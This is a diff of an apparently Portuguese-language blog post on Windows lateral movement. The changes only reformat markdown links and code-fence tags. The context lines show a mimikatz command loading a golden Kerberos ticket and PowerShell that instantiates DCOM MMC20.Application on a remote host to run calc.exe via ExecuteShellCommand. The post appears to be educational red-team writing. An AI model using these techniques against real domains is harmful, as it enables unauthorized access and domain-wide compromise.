@@ -38,8 +38,8 @@ em um servidor comum, utilizei essa técnica para fazer a movimentação lateral
 eu utilizaria essa técnica em todo o domínio com um golden ticket impersonated, tornando essa
 movimentação possível sem necessidade de credenciais.
 
-Mas para entender como essa técnica funciona, é preciso entender um pouco sobre [https://learn.microsoft.com/en-us/windows/win32/com/the-component-object-model]COM (Component
-Object Model) e [https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4a893f3d-bd29-48cd-9f43-d9777a4415b0]DCOM (Distributed Component Object Model)
+Mas para entender como essa técnica funciona, é preciso entender um pouco sobre [COM (Component
+Object Model)](https://learn.microsoft.com/en-us/windows/win32/com/the-component-object-model) e [DCOM (Distributed Component Object Model)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4a893f3d-bd29-48cd-9f43-d9777a4415b0)
 
 # Component Object Model (COM)
 
@@ -59,7 +59,7 @@ um UNC path ou diretamente o servidor e começar a comunicação, desde que voc�
 permissão.
 
 Personificando golden ticket 
-```PowerShell
+```powershell
 PS> mimikatz.exe "kerberos::ptt C:\Tickets\gold.kirbi"
 * File: 'C:\Tickets\gold.kirbi': OK```
 
@@ -89,7 +89,7 @@ Tendo em vista que a conexão foi estabelecida com sucesso, podemos
 invokar esse método, basta seguir sua definição.
 
 Realizando conexão com a classe MMC20.Application (DCOM)
-```PowerShell
+```powershell
 PS> $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.1.10"))
 PS> $dcom.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\calc.exe",$null,$null,7)
 
